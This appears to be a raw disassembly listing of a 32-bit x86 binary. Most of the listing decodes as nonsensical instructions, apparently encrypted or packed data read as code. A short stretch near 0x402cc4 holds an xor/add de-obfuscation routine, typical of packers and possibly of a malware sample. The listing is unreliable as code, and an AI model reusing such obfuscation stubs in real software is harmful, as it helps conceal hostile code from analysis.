  40295a:	and    eax,0x5882b062
  40295f:	stc    
  402960:	cli    
  402961:	rcl    BYTE PTR [edi+0x64],1
  402964:	mov    ah,0xb
  402966:	stos   DWORD PTR es:[edi],eax
  402967:	sbb    BYTE PTR [ecx+ebp*1+0x462384dd],ch
  40296e:	inc    ecx
  40296f:	pusha  
  402970:	pusha  
  402971:	mov    eax,ds:0x25e72b0c
  402976:	sub    DWORD PTR [ecx],0x1d
  402979:	cmc    
  40297a:	jb     0x4029d8
  40297c:	adc    al,0x79
  40297e:	fist   WORD PTR ds:0xd27a0797
  402984:	cmc    
  402985:	cmc    
  402986:	nop
  402987:	mov    ds:0x6b23fb3a,eax
  40298c:	fmul   QWORD PTR ds:0x6b5f059f
  402992:	ins    BYTE PTR es:[edi],dx
  402993:	jbe    0x40295a
  402995:	mov    cl,BYTE PTR [edi]
  402997:	mov    edx,0x9aabde83
  40299c:	or     ebp,DWORD PTR [eax]
  40299e:	dec    ebp
  40299f:	jb     0x4029c5
  4029a1:	push   ds
  4029a2:	mov    DWORD PTR [edi-0xc4c7c00],esi
  4029a8:	js     0x4029ae
  4029aa:	lods   eax,DWORD PTR ds:[esi]
  4029ab:	add    bh,BYTE PTR [ebx]
  4029ad:	push   0xffffffc8
  4029af:	test   esi,ebp
  4029b1:	mov    edi,DWORD PTR [bx-0x32d9]
  4029b6:	nop
  4029b7:	xchg   ecx,eax
  4029b8:	loop   0x402988
  4029ba:	mov    bl,0xa4
  4029bc:	inc    edi
  4029bd:	bound  ebx,QWORD PTR [edx]
  4029bf:	push   eax
  4029c0:	lods   eax,DWORD PTR ds:[esi]
  4029c1:	push   ds
  4029c2:	fidiv  DWORD PTR [esi]
  4029c4:	cld    
  4029c5:	cmp    ch,BYTE PTR [ebx+0x3d]
  4029c8:	pusha  
  4029c9:	xchg   ecx,eax
  4029ca:	xor    ecx,DWORD PTR [ebx]
  4029cc:	sahf   
  4029cd:	ficomp WORD PTR [edx+0x4f406558]
  4029d3:	and    BYTE PTR [edx+0x2e],al
  4029d6:	mov    eax,0x6f7043db
  4029db:	adc    eax,0xe2ea4539
  4029e0:	mov    ecx,esi
  4029e2:	fdivr  DWORD PTR [ebp+0x78]
  4029e5:	xchg   edx,eax
  4029e6:	xchg   ebx,eax
  4029e7:	imul   edx,DWORD PTR [edi],0xfffffffb
  4029ea:	retf   0x7776
  4029ed:	jnp    0x402a59
  4029ef:	pop    es
  4029f0:	ins    DWORD PTR es:[edi],dx
  4029f1:	pop    edi
  4029f2:	and    BYTE PTR [ecx+0x6d],0x42
  4029f6:	xchg   edx,eax
  4029f7:	xlat   BYTE PTR ds:[ebx]
  4029f8:	xor    ebp,DWORD PTR [ebp-0x79]
  4029fb:	and    al,0x18
  4029fd:	mov    cl,0x58
  4029ff:	jbe    0x402a0c
  402a01:	add    al,0x67
  402a03:	mov    ecx,DWORD PTR [ebx-0x5d]
  402a06:	int    0x6f
  402a08:	loope  0x402a23
  402a0a:	cmp    BYTE PTR [esp+esi*8-0x5f],ch
  402a0e:	in     eax,0xe4
  402a10:	adc    esi,edx
  402a12:	cmp    eax,0xecdfffc9
  402a17:	ds call 0xeeb3:0xe08cc6a7
  402a1f:	pop    esp
  402a20:	mov    eax,ss
  402a22:	imul   ecx,eax,0x8ebfa39f
  402a28:	into   
  402a29:	jp     0x402a02
  402a2b:	jb     0x402a5b
  402a2d:	mov    ah,0x3b
  402a2f:	pop    es
  402a30:	clc    
  402a31:	arpl   si,bx
  402a33:	ins    DWORD PTR es:[edi],dx
  402a34:	jl     0x402a21
  402a36:	jl     0x4029e1
  402a38:	pop    ebx
  402a39:	inc    esi
  402a3a:	adc    al,0xab
  402a3c:	and    bl,BYTE PTR ds:0x2212be0e
  402a42:	cwde   
  402a43:	jo     0x402a74
  402a45:	rol    DWORD PTR [esi+0x6d9005f8],cl
  402a4b:	rcr    dh,1
  402a4d:	pop    edi
  402a4e:	xlat   BYTE PTR ds:[ebx]
  402a4f:	dec    ebx
  402a50:	das    
  402a51:	adc    eax,DWORD PTR [edx+0x5b]
  402a54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a55:	cmp    eax,0x55f4a4e3
  402a5a:	sub    BYTE PTR [esi+0x2f67367a],al
  402a60:	sub    dl,ch
  402a62:	adc    ecx,DWORD PTR [ebx]
  402a64:	wrmsr  
  402a66:	sti    
  402a67:	pushf  
  402a68:	fcmovnbe st,st(5)
  402a6a:	mov    ch,0x2
  402a6c:	sub    DWORD PTR [ecx-0x525b28eb],edi
  402a72:	sbb    eax,0xe198405b
  402a77:	mov    ?,WORD PTR ds:0xf132c398
  402a7d:	rcr    ecx,cl
  402a7f:	pop    eax
  402a80:	mov    bh,0x9c
  402a82:	xchg   DWORD PTR [ecx+ebx*4],edx
  402a85:	retf   
  402a86:	jmp    0x4e7e:0x7a35ed1c
  402a8d:	retf   
  402a8e:	ins    DWORD PTR es:[edi],dx
  402a8f:	cmc    
  402a90:	and    BYTE PTR [esi],al
  402a92:	loopne 0x402a6e
  402a94:	int    0x6e
  402a96:	xchg   ebp,eax
  402a97:	mov    ah,0x68
  402a99:	pop    esp
  402a9a:	stos   DWORD PTR es:[edi],eax
  402a9b:	imul   esi,DWORD PTR [esi],0x44e7699e
  402aa1:	(bad)  
  402aa2:	xchg   edi,eax
  402aa3:	jmp    DWORD PTR [esi]
  402aa5:	pop    edi
  402aa6:	imul   edi,DWORD PTR [ecx],0x5f028454
  402aac:	inc    ecx
  402aad:	mov    al,0x1d
  402aaf:	pop    eax
  402ab0:	jmp    0xaa92:0xa7cb6acc
  402ab7:	and    al,0xb1
  402ab9:	repnz mov al,ds:0xfc9bce11
  402abf:	or     cl,al
  402ac1:	inc    edi
  402ac2:	jne    0x402ab7
  402ac4:	in     eax,0x45
  402ac6:	jg     0x402afe
  402ac8:	(bad)  
  402ac9:	and    eax,0x5133040d
  402ace:	cmp    edx,ebp
  402ad0:	repz not DWORD PTR [ebx-0x61]
  402ad4:	inc    edi
  402ad5:	push   esp
  402ad6:	mov    esi,0x6afd62e4
  402adb:	loope  0x402a6c
  402add:	or     bh,0x52
  402ae0:	daa    
  402ae1:	cs dec ebx
  402ae3:	adc    ah,BYTE PTR [esi+0x76]
  402ae6:	or     bh,ch
  402ae8:	test   eax,0x37bf5e82
  402aed:	call   0xf2e5:0x8ca5e1c6
  402af4:	adc    edi,eax
  402af6:	outs   dx,BYTE PTR ds:[esi]
  402af7:	fcom   QWORD PTR [ecx]
  402af9:	pop    ebp
  402afa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402afb:	clc    
  402afc:	cmc    
  402afd:	mov    esi,0x8532e31d
  402b02:	inc    ebp
  402b03:	retf   0xa48f
  402b06:	js     0x402afb
  402b08:	xchg   ecx,eax
  402b09:	xchg   ecx,eax
  402b0a:	adc    bl,ah
  402b0c:	es and eax,0x6fb5db49
  402b12:	je     0x402b00
  402b14:	xchg   BYTE PTR [eax+ebp*2],bl
  402b17:	hlt    
  402b18:	in     eax,dx
  402b19:	lods   eax,DWORD PTR ds:[esi]
  402b1a:	cmp    ebp,DWORD PTR [eiz*2+0x13f0dd11]
  402b21:	xchg   edi,eax
  402b22:	push   ds
  402b23:	sahf   
  402b24:	push   ebx
  402b25:	cmp    BYTE PTR [edx],cl
  402b27:	xchg   edx,eax
  402b28:	or     al,0xfa
  402b2a:	std    
  402b2b:	push   ecx
  402b2c:	pop    ss
  402b2d:	jge    0x402aff
  402b2f:	out    0x36,al
  402b31:	push   es
  402b32:	or     BYTE PTR [edx],al
  402b34:	leave  
  402b35:	push   esp
  402b36:	xor    eax,ecx
  402b38:	xor    DWORD PTR [ecx+edx*1-0x2a1e9f9],ebp
  402b3f:	inc    ebp
  402b40:	in     al,0xa0
  402b42:	clc    
  402b43:	xchg   esi,eax
  402b44:	mov    ds:0x6fba5c52,al
  402b49:	std    
  402b4a:	add    bh,BYTE PTR gs:[esi+0x43]
  402b4e:	imul   edx,esp,0xffffffd3
  402b51:	push   cs
  402b52:	into   
  402b53:	mov    bl,0xee
  402b55:	jg     0x402bb4
  402b57:	js     0x402b88
  402b59:	xchg   DWORD PTR [esi],edi
  402b5b:	push   ss
  402b5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b5d:	test   eax,0xbcf5eb1b
  402b62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b63:	and    eax,0x5403a5ec
  402b68:	(bad)  
  402b69:	sbb    dl,BYTE PTR ds:0xdcedc780
  402b6f:	mov    ecx,0x78bdc48c
  402b74:	sub    DWORD PTR [ecx-0x7f],edx
  402b77:	mov    ecx,0x8c17d2cb
  402b7c:	and    al,0xf5
  402b7e:	test   DWORD PTR [esi+eax*8+0x2a09c6bf],edi
  402b85:	cs push es
  402b87:	sbb    ecx,esi
  402b89:	jp     0x402bcb
  402b8b:	stos   DWORD PTR es:[edi],eax
  402b8c:	cs mov ebp,0xbaae5d0e
  402b92:	std    
  402b93:	sub    al,0x1
  402b95:	test   BYTE PTR [edx+edx*4+0x37],0x4c
  402b9a:	in     eax,dx
  402b9b:	fisubr DWORD PTR [ebx+0x26594f72]
  402ba1:	popf   
  402ba2:	in     eax,dx
  402ba3:	gs mov ebp,0x40bf23d2
  402ba9:	lods   al,BYTE PTR ds:[esi]
  402baa:	cmp    eax,0xbef8c5f
  402baf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bb0:	retf   
  402bb1:	pusha  
  402bb2:	inc    esp
  402bb3:	jl     0x402b77
  402bb5:	push   ebp
  402bb6:	jns    0x402ba5
  402bb8:	sbb    ecx,DWORD PTR [edi+0x566e53bf]
  402bbe:	mov    DWORD PTR [eax],ecx
  402bc0:	adc    bh,ah
  402bc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bc3:	sahf   
  402bc4:	push   edx
  402bc5:	and    al,0xca
  402bc7:	cmp    ecx,0x36
  402bca:	add    DWORD PTR ds:0x549bbb33,ebx
  402bd0:	mov    al,0x35
  402bd2:	push   eax
  402bd3:	ret    
  402bd4:	aam    0xae
  402bd6:	mov    ebx,0xb505d16d
  402bdb:	sub    edi,ecx
  402bdd:	adc    BYTE PTR [edi+0x4a],ch
  402be0:	jl     0x402bcd
  402be2:	dec    ecx
  402be3:	out    dx,eax
  402be4:	sub    eax,0x12623e17
  402be9:	shr    DWORD PTR [ecx-0x3dbff0c3],0x41
  402bf0:	xchg   edi,eax
  402bf1:	(bad)  
  402bf2:	call   0xb37603e7
  402bf7:	adc    edx,DWORD PTR [edx+0x6d]
  402bfa:	aaa    
  402bfb:	cmp    al,0x3e
  402bfd:	lahf   
  402bfe:	cli    
  402bff:	(bad)  
  402c00:	clc    
  402c01:	pushf  
  402c02:	xchg   ebx,eax
  402c03:	add    BYTE PTR [ecx],bl
  402c05:	enter  0xdb9d,0xb4
  402c09:	call   0x2ecb54e9
  402c0e:	inc    edi
  402c0f:	fmulp  st(2),st
  402c11:	clc    
  402c12:	pop    esp
  402c13:	mov    ch,0xa9
  402c15:	mov    dl,0x10
  402c17:	inc    esi
  402c18:	popa   
  402c19:	dec    esp
  402c1a:	push   ds
  402c1b:	cmp    ax,0x41fb
  402c1f:	mov    al,0x90
  402c21:	mov    ebx,0x1f155e02
  402c26:	and    DWORD PTR [eax-0xe],edi
  402c29:	jbe    0x402bee
  402c2b:	sub    al,dh
  402c2d:	jno    0x402c39
  402c2f:	aam    0x10
  402c31:	and    eax,0x185f4cb8
  402c36:	outs   dx,DWORD PTR ds:[esi]
  402c37:	test   al,0xf7
  402c39:	inc    ecx
  402c3a:	inc    edi
  402c3b:	out    0x78,al
  402c3d:	cli    
  402c3e:	ror    eax,cl
  402c40:	push   ecx
  402c41:	mov    ebp,0x2d9aa48e
  402c46:	xchg   edi,eax
  402c47:	xchg   ecx,eax
  402c48:	int3   
  402c49:	stos   DWORD PTR es:[edi],eax
  402c4a:	dec    ebp
  402c4b:	push   ecx
  402c4c:	or     ah,BYTE PTR [eax-0xcc81efa]
  402c52:	jmp    0x402cb6
  402c54:	test   BYTE PTR [edi+0x63],dl
  402c57:	xor    BYTE PTR [ecx],ah
  402c59:	pop    edi
  402c5a:	xor    al,cl
  402c5c:	push   ecx
  402c5d:	or     esp,DWORD PTR [ebx]
  402c5f:	fsubr  QWORD PTR [eax-0x5239e78b]
  402c65:	mov    bh,0xc2
  402c67:	adc    BYTE PTR [edi-0x464b630d],dl
  402c6d:	cmp    dl,BYTE PTR [edi-0x43097150]
  402c73:	das    
  402c74:	data16 ja 0x402c35
  402c77:	xor    esi,DWORD PTR [eax+0x2]
  402c7a:	pop    edi
  402c7b:	xchg   edi,eax
  402c7c:	stos   DWORD PTR es:[edi],eax
  402c7d:	jmp    0xb4b7:0x151dcf00
  402c84:	xor    ch,BYTE PTR [edx]
  402c86:	cwde   
  402c87:	mov    bl,0x1d
  402c89:	bound  esi,QWORD PTR ds:0x6ae760bd
  402c8f:	mov    eax,ds:0x98172ea1
  402c94:	hlt    
  402c95:	xlat   BYTE PTR ds:[ebx]
  402c96:	fs push es
  402c98:	dec    edx
  402c9a:	mov    fs,WORD PTR [ecx+edx*1+0x1efcf0d1]
  402ca1:	ret    0x1fd6
  402ca4:	adc    ah,al
  402ca6:	in     eax,dx
  402ca7:	or     esi,esi
  402ca9:	add    al,0xf8
  402cab:	out    dx,al
  402cac:	inc    dx
  402cae:	push   edi
  402caf:	dec    ecx
  402cb0:	jle    0x402cf4
  402cb2:	jno    0x402ccd
  402cb4:	jmp    0x6853958f
  402cb9:	aaa    
  402cba:	imul   esi,DWORD PTR [edx+edx*4-0x55fa345d],0x0
  402cc2:	add    BYTE PTR [eax],al
  402cc4:	push   eax
  402cc5:	mov    eax,DWORD PTR [ebp-0x18]
  402cc8:	mov    eax,DWORD PTR [eax+0x198]
  402cce:	push   DWORD PTR [eax]
  402cd0:	call   0x40c099
  402cd5:	mov    DWORD PTR [ebp-0x4],eax
  402cd8:	cmp    DWORD PTR [ebp-0x4],0x0
  402cdc:	lea    eax,[ebp+0x4]
  402cdf:	mov    DWORD PTR [ebp-0x38],eax
  402ce2:	je     0x404656
  402ce8:	lea    eax,[ebp-0xc]
  402ceb:	mov    DWORD PTR [ebp-0x30],eax
  402cee:	mov    eax,DWORD PTR [ebp-0x4c]
  402cf1:	xor    eax,esi
  402cf3:	add    eax,edi
  402cf5:	mov    DWORD PTR [ebp-0x34],eax
  402cf8:	mov    eax,DWORD PTR [ebp-0x28]
  402cfb:	xor    eax,esi
  402cfd:	add    eax,edi
  402cff:	mov    DWORD PTR [ebp-0x20],eax
  402d02:	mov    eax,DWORD PTR [ebp-0x4]
  402d05:	mov    DWORD PTR [ebp-0x24],eax
  402d08:	lea    eax,[ebp-0x98]
  402d0e:	mov    DWORD PTR [ebp-0x8],eax
  402d11:	mov    eax,DWORD PTR [ebp-0x10]
  402d14:	mov    DWORD PTR [ebp-0x10],eax
  402d17:	mov    eax,DWORD PTR [ebp-0x1c]
  402d1a:	mov    DWORD PTR [ebp-0x40],ebx
  402d1d:	mov    DWORD PTR [ebp-0x2c],eax
  402d20:	mov    eax,DWORD PTR [ebp-0x40]
  402d23:	mov    ecx,DWORD PTR [ebp-0x8]
  402d26:	xor    eax,esi
  402d28:	add    eax,0x32729b
  402d2d:	jmp    0x40313b
  402d32:	stos   DWORD PTR es:[edi],eax
  402d33:	addr16 clc 
  402d35:	in     eax,0x50
  402d37:	loope  0x402dac
  402d39:	jno    0x402d4f
  402d3b:	jo     0x402d34
  402d3d:	and    cl,BYTE PTR fs:[ebx+0x99846d9]
  402d44:	jle    0x402dc4
  402d46:	outs   dx,DWORD PTR ds:[esi]
  402d47:	jge    0x402dc7
  402d49:	jle    0x402d0a
  402d4b:	ficomp DWORD PTR [edx+0x36]
  402d4e:	ins    BYTE PTR es:[edi],dx
  402d4f:	ror    BYTE PTR [edx-0x799ce905],cl
  402d55:	retf   0xc284
  402d58:	test   eax,0x25f16275
  402d5d:	out    0x23,eax
  402d5f:	mov    eax,0x513bc8b7
  402d64:	adc    al,BYTE PTR [eax]
  402d66:	adc    eax,0x7a8137a7
  402d6b:	test   DWORD PTR [ebx],esp
  402d6d:	jle    0x402dcf
  402d6f:	mov    eax,0x5ae6e497
  402d74:	pop    es
  402d75:	iret   
  402d76:	mov    edx,0x93d434c3
  402d7b:	and    edi,DWORD PTR ds:0xf6899d63
  402d81:	ins    BYTE PTR es:[edi],dx
  402d82:	mov    ah,0x21
  402d84:	sbb    esp,DWORD PTR [ecx-0x44]
  402d87:	jmp    0x402d22
  402d89:	push   edx
  402d8a:	jne    0x402dbd
  402d8c:	or     al,BYTE PTR [ecx-0x51d230cd]
  402d92:	jae    0x402d82
  402d94:	ror    BYTE PTR [ecx-0x4bbac072],cl
  402d9a:	add    esp,ebp
  402d9c:	dec    esi
  402d9d:	and    BYTE PTR [esi+0x7dea09a3],bh
  402da3:	ds aam 0xc
  402da6:	xor    bl,dh
  402da8:	inc    ebx
  402da9:	daa    
  402daa:	mov    esi,0xf5923059
  402daf:	cdq    
  402db0:	das    
  402db1:	(bad)  
  402db2:	xor    DWORD PTR [ecx-0x9],eax
  402db5:	jo     0x402d7b
  402db7:	cs push esp
  402db9:	adc    bh,ah
  402dbb:	inc    ebx
  402dbc:	loop   0x402d72
  402dbe:	std    
  402dbf:	je     0x402d96
  402dc1:	dec    ebx
  402dc2:	mov    bl,0x7b
  402dc4:	push   edi
  402dc5:	sub    DWORD PTR [ebp+0x188a75f2],ebx
  402dcb:	push   ebx
  402dcc:	dec    esi
  402dcd:	adc    al,0x3
  402dcf:	xchg   esi,eax
  402dd0:	cmp    dh,BYTE PTR [edx+0x57060de2]
  402dd6:	js     0x402df8
  402dd8:	mul    BYTE PTR [ebx]
  402dda:	out    0x7c,eax
  402ddc:	push   edx
  402ddd:	inc    esp
  402dde:	hlt    
  402ddf:	push   esi
  402de0:	ret    
  402de1:	pminub mm0,QWORD PTR [ecx-0x3f]
  402de5:	call   0xf5d0:0xbb0fa3a1
  402dec:	push   esp
  402ded:	adc    esi,DWORD PTR [eax+0x3c]
  402df0:	dec    edx
  402df1:	xchg   ecx,eax
  402df2:	pop    edi
  402df3:	into   
  402df4:	rol    BYTE PTR [ebx-0x25],0xb
  402df8:	pop    edx
  402df9:	mov    eax,0x1af135ff
  402dfe:	xor    al,0x86
  402e00:	mov    DWORD PTR [edi],0xba62bf67
  402e06:	xor    al,0xde
  402e08:	iret   
  402e09:	push   ebx
  402e0a:	cld    
  402e0b:	enter  0xc4b,0xfe
  402e0f:	out    0x6,al
  402e11:	xchg   BYTE PTR [eax+ecx*1],bh
  402e14:	inc    eax
  402e15:	dec    eax
  402e16:	ins    DWORD PTR es:[edi],dx
  402e17:	rcl    BYTE PTR [ebx-0x25d514ca],1
  402e1d:	sub    eax,0x83c8d648
  402e22:	and    al,0x18
  402e24:	jge    0x402dae
  402e26:	add    ecx,edx
  402e28:	arpl   WORD PTR [esi],bx
  402e2a:	out    dx,eax
  402e2b:	in     eax,dx
  402e2c:	lea    edx,[eax-0x41744723]
  402e32:	test   bl,ch
  402e34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e35:	xor    eax,0xaf5c97fe
  402e3a:	test   eax,0x10155e11
  402e3f:	lock jmp 0x402e98
  402e42:	rcl    BYTE PTR [eax+0x3df6da38],cl
  402e48:	fcmovb st,st(5)
  402e4a:	lds    esp,FWORD PTR [ecx-0x65453938]
  402e50:	push   0x10
  402e52:	inc    ebp
  402e53:	lahf   
  402e54:	sti    
  402e55:	xchg   BYTE PTR [edi-0x7e282847],dh
  402e5b:	cdq    
  402e5c:	loop   0x402e8f
  402e5e:	sti    
  402e5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e60:	add    dl,BYTE PTR [ebx+ecx*1+0x1673b1f4]
  402e67:	dec    ebp
  402e68:	jl     0x402e6f
  402e6a:	xchg   esi,eax
  402e6b:	adc    cl,bh
  402e6d:	call   0xa7c6:0xb8500dc8
  402e74:	adc    bh,BYTE PTR [ebx]
  402e76:	fnstenv [ebx-0x45]
  402e79:	ror    BYTE PTR [edx-0x3a],0xfd
  402e7d:	inc    eax
  402e7e:	mov    bl,0x2
  402e80:	xor    dh,BYTE PTR [edi+0x78]
  402e83:	jmp    0xfc7f:0x6833587f
  402e8a:	fst    DWORD PTR [eax+esi*1+0x1c104202]
  402e91:	mov    esp,0x6ca6aae6
  402e96:	and    BYTE PTR [edi],ah
  402e98:	xor    DWORD PTR [eax],0x145ff5cd
  402e9e:	out    0x30,eax
  402ea0:	fst    QWORD PTR [eax*2+0x3e3e844a]
  402ea7:	(bad)  
  402ea9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402eaa:	rcl    BYTE PTR es:[edi-0x16],1
  402eae:	and    dl,BYTE PTR [ebx+0x7d]
  402eb1:	mov    BYTE PTR [ebx],dh
  402eb3:	dec    ebp
  402eb4:	ror    DWORD PTR [esi+0x737cbeb6],0xf2
  402ebb:	jne    0x402f17
  402ebd:	ret    0x4165
  402ec0:	mov    edx,0xa4e86a97
  402ec5:	lods   eax,DWORD PTR ds:[esi]
  402ec6:	bound  edx,QWORD PTR [edx-0x5a2440db]
  402ecc:	cmp    DWORD PTR [ebp+0x4c0053],ebx
  402ed2:	ss dec esi
  402ed4:	or     bl,BYTE PTR ds:0x5e2e9c7b
  402eda:	int3   
  402edb:	repnz arpl WORD PTR [edi-0x4],bx
  402edf:	sub    cl,al
  402ee1:	push   ebx
  402ee2:	mov    ebx,0x82354094
  402ee7:	mul    DWORD PTR [eax+0x62]
  402eea:	add    eax,0x96f3c199
  402eef:	pop    ebp
  402ef0:	cmp    DWORD PTR [ebp-0x1d],esi
  402ef3:	cs pusha 
  402ef5:	ds jo  0x402e82
  402ef8:	xchg   ecx,eax
  402ef9:	lods   al,BYTE PTR ds:[esi]
  402efa:	fcmovnbe st,st(5)
  402efc:	je     0x402ed3
  402efe:	mov    eax,0xf85a3de2
  402f03:	lock ret 0x27ef
  402f07:	int3   
  402f08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f09:	test   bh,dl
  402f0b:	test   BYTE PTR [edx-0x461a42ae],ah
  402f11:	addr16 mov ebp,0x9ff4ee5c
  402f17:	shl    BYTE PTR [ebp-0x1f9eacee],0x74
  402f1e:	mov    bl,0x6b
  402f20:	lds    ecx,FWORD PTR [edx]
  402f22:	(bad)  
  402f23:	xchg   esi,eax
  402f24:	fdiv   DWORD PTR [eax+ebp*4-0x5c3f9454]
  402f2b:	push   ebx
  402f2c:	dec    esp
  402f2d:	jp     0x402f3d
  402f2f:	outs   dx,BYTE PTR ds:[esi]
  402f30:	(bad)  
  402f31:	out    dx,al
  402f32:	pop    es
  402f33:	test   DWORD PTR [edx-0xd9f2983],ebp
  402f39:	pusha  
  402f3a:	into   
  402f3b:	jne    0x402f48
  402f3d:	add    edi,DWORD PTR [eax+ebp*1-0x76ae82ef]
  402f44:	xor    al,0x51
  402f46:	test   DWORD PTR [edx+0x490a8e6],esi
  402f4c:	fcmovnu st,st(5)
  402f4e:	bnd jbe 0x402f4a
  402f51:	mov    cl,0x84
  402f53:	in     al,dx
  402f54:	(bad)  
  402f55:	push   ds
  402f56:	(bad)  
  402f58:	adc    DWORD PTR [ebx+0x23],edi
  402f5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f5c:	(bad)  
  402f5d:	js     0x402f52
  402f5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f60:	(bad)  
  402f61:	out    dx,eax
  402f62:	ja     0x402fba
  402f64:	xor    DWORD PTR [ecx],0xffffffb9
  402f67:	jg     0x402f35
  402f69:	bound  esi,QWORD PTR [edx+0x57]
  402f6c:	jge    0x402f79
  402f6e:	push   0x35
  402f70:	cmc    
  402f71:	jns    0x402f59
  402f73:	mov    BYTE PTR [edx],ah
  402f75:	stos   BYTE PTR es:[edi],al
  402f76:	mov    ds:0x7f96079b,al
  402f7b:	jmp    0xa5aa4d9
  402f80:	jb     0x402fa1
  402f82:	mov    ds:0x87f2a5d4,eax
  402f87:	xor    cl,BYTE PTR ds:0x41185bc5
  402f8d:	test   BYTE PTR [esp+edi*1+0x5e],bl
  402f91:	add    eax,0x50c057da
  402f96:	dec    edi
  402f97:	jmp    0xdcfe:0x347efef
  402f9e:	sub    al,0x10
  402fa0:	fdiv   QWORD PTR [ebp-0x7e759200]
  402fa6:	mov    DWORD PTR [ebx+0x71],eax
  402fa9:	dec    esp
  402faa:	rcr    BYTE PTR [esi+0x664d8aaf],0x9a
  402fb1:	jle    0x402f94
  402fb3:	sahf   
  402fb4:	dec    esi
  402fb5:	or     DWORD PTR [eax],esi
  402fb7:	add    DWORD PTR [edi+0x46],edi
  402fba:	and    DWORD PTR [ebx-0x2622373d],esp
  402fc0:	outs   dx,DWORD PTR ds:[esi]
  402fc1:	mov    al,ds:0xc650cca9
  402fc6:	lods   eax,DWORD PTR ds:[esi]
  402fc7:	mov    ?,WORD PTR [edx+0x2aabe3c8]
  402fcd:	(bad)  
  402fce:	stos   BYTE PTR es:[edi],al
  402fcf:	and    DWORD PTR [bx+si-0x2f],edi
  402fd3:	aaa    
  402fd4:	pop    ss
  402fd5:	add    eax,0x5d68268b
  402fda:	loopne 0x402f7b
  402fdc:	xor    DWORD PTR ds:0xda325292,edi
  402fe2:	sahf   
  402fe3:	(bad)  
  402fe4:	xor    dl,BYTE PTR [eax+0x0]
  402fe7:	xchg   DWORD PTR [esi+ebp*2],esp
  402fea:	and    DWORD PTR [edx-0xd],0x3f8118
  402ff1:	sbb    al,0xf1
  402ff3:	or     eax,0xcf7d806e
  402ff8:	pop    ds
  402ff9:	(bad)  
  402ffa:	stc    
  402ffb:	sub    eax,0x78da25f0
  403000:	stc    
  403001:	outs   dx,DWORD PTR ds:[esi]
  403002:	call   0x8b41:0x56a8b0d7
  403009:	jp     0x403068
  40300b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40300c:	icebp  
  40300d:	dec    esi
  40300e:	mov    ah,0xf1
  403010:	xor    BYTE PTR [edx+0x3],0xb2
  403014:	outs   dx,DWORD PTR ds:[esi]
  403015:	fcmovnbe st,st(7)
  403017:	push   0xffffffaf
  403019:	mov    edi,0x782ea134
  40301e:	xor    DWORD PTR [esi],edx
  403020:	adc    dh,cl
  403022:	dec    ebp
  403023:	inc    ebx
  403024:	xchg   BYTE PTR [ebp+0x4b7a3afd],bh
  40302a:	sub    bl,BYTE PTR [ebp+ebp*8-0x60]
  40302e:	push   ebp
  40302f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403030:	ror    DWORD PTR [edi+edx*2+0x14],0x38
  403035:	cmp    eax,0xb974b7b4
  40303a:	mov    ebx,0x2eaeb866
  40303f:	mov    esi,0x98d3f6de
  403044:	lds    ebp,FWORD PTR [ebx]
  403046:	adc    al,0xab
  403048:	sbb    DWORD PTR [eax-0x1e],0x6bb29f48
  40304f:	add    al,BYTE PTR [ecx-0x24]
  403052:	lea    esp,[edi]
  403054:	jle    0x4030c9
  403056:	dec    esp
  403057:	or     al,BYTE PTR [eax]
  403059:	ins    BYTE PTR es:[edi],dx
  40305a:	or     al,0x6
  40305c:	inc    ebp
  40305d:	je     0x4030b0
  40305f:	dec    ebx
  403060:	setl   BYTE PTR [esi+0x4d]
  403064:	and    eax,0xfe46eba9
  403069:	push   ss
  40306a:	aam    0xeb
  40306c:	ret    
  40306d:	inc    eax
  40306e:	je     0x4030ec
  403070:	aaa    
  403071:	push   0xf2dcb46
  403076:	daa    
  403077:	inc    edi
  403078:	mov    ds:0xa1b7c40f,al
  40307d:	loop   0x4030f5
  40307f:	sub    al,0x0
  403081:	loope  0x40300b
  403083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403084:	and    bl,BYTE PTR [edx+0x4e]
  403087:	push   ebp
  403088:	sahf   
  403089:	jmp    0x403065
  40308b:	push   ebx
  40308c:	scas   al,BYTE PTR es:[edi]
  40308d:	xor    cl,BYTE PTR [ebx+0x79]
  403090:	(bad)  [ebx]
  403092:	dec    edi
  403093:	sti    
  403094:	stc    
  403095:	adc    eax,0xeed8781
  40309a:	imul   esi,ebp,0x3
  40309d:	out    dx,eax
  40309e:	jmp    0x4030fc
  4030a0:	fcom   QWORD PTR ds:0xc617fec9
  4030a6:	cwde   
  4030a7:	mov    ch,dl
  4030a9:	lods   eax,DWORD PTR ds:[esi]
  4030aa:	rcl    BYTE PTR [eax+0x6a],0x24
  4030ae:	mov    dl,0xfe
  4030b0:	fmul   QWORD PTR ds:0xdd3e8398
  4030b6:	inc    esi
  4030b7:	rcr    BYTE PTR ds:0x70d1f19f,cl
  4030bd:	xor    BYTE PTR [esi+0x258e1644],bl
  4030c3:	out    0x84,al
  4030c5:	sub    ebp,ebp
  4030c7:	fiadd  WORD PTR [ebx]
  4030c9:	std    
  4030ca:	loop   0x403066
  4030cc:	cmc    
  4030cd:	fidiv  WORD PTR [eax]
  4030cf:	sub    BYTE PTR [ebp+0x25b7e2ca],ch
  4030d5:	adc    DWORD PTR [esi-0x2b],esp
  4030d8:	jmp    0x809ed8e2
  4030dd:	xor    al,0x21
  4030df:	or     ah,BYTE PTR [esi-0x57]
  4030e2:	ins    BYTE PTR es:[edi],dx
  4030e3:	sub    DWORD PTR [ecx-0x52],esi
  4030e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030e7:	jns    0x40315c
  4030e9:	dec    ebp
  4030ea:	retf   
  4030eb:	sti    
  4030ec:	push   edi
  4030ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
